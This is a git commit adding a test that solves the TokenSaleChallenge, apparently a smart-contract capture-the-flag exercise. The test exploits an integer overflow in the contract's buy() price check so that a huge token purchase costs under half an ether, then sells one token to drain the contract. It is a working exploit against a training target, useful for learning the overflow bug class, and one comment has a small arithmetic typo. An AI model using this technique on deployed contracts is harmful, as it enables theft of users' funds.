a07a23fe54149f7debf73a1d46194b445b0e2a2b
ffmcgee <jc.992@hotmail.com>
2024-09-12 08:17:07 +0200

    test: exploit for TokenSaleChallenge

--- test/10-TokenSale.test.ts
+++ test/10-TokenSale.test.ts
@@ -25,8 +25,37 @@ describe('TokenSaleChallenge', () => {
 
   it('exploit', async () => {
     /**
-     * YOUR CODE HERE
-     * */
+     * function buy has condition `require(msg.value == numTokens * PRICE_PER_TOKEN);``
+     * PRICE_PER_TOKEN = 1 ether | which is 10**18 in wei
+     * and we know 2**256 will trigger a number overflow, and become a very low value (which is what we want msg.value to be)
+     * so we get OVERFLOW_UINT_TOKEN_AMOUNT (numTokens) by getting a number just slightly lower than 2**256
+     *  => 115792089237316195423570985008687907853269984665640564039458
+     * and ETH_MSG_VALUE_AFTER_OVERFLOW (msg.value) is OVERFLOW_UINT_TOKEN_AMOUNT / 18**18,
+     */
+
+    const OVERFLOW_UINT_TOKEN_AMOUNT =
+      '115792089237316195423570985008687907853269984665640564039458';
+    const ETH_MSG_VALUE_AFTER_OVERFLOW = '415992086870360064';
+
+    /**
+     * We will effectively buy a large number of tokens (due to the overflow),
+     * but only pay a small amount of Ether (0.415992086870360064 ether).
+     */
+
+    const buyTx = await target.buy(OVERFLOW_UINT_TOKEN_AMOUNT, {
+      value: ETH_MSG_VALUE_AFTER_OVERFLOW,
+    });
+    await buyTx.wait();
+
+    /**
+     * After purchasing a huge number of tokens with a small amount of Ether, you call the sell function to sell 1 token.
+     * Since PRICE_PER_TOKEN is 1 ether, selling 1 token will send 1 ether back to the caller.
+     * The contract started with exactly 1 ether in its balance (from the constructor).
+     * After selling this 1 token, the contract’s balance drops below 1 ether.
+     */
+    
+    const exploitTx = await target.sell(1);
+    await exploitTx.wait();
 
     expect(await target.isComplete()).to.equal(true);
   });
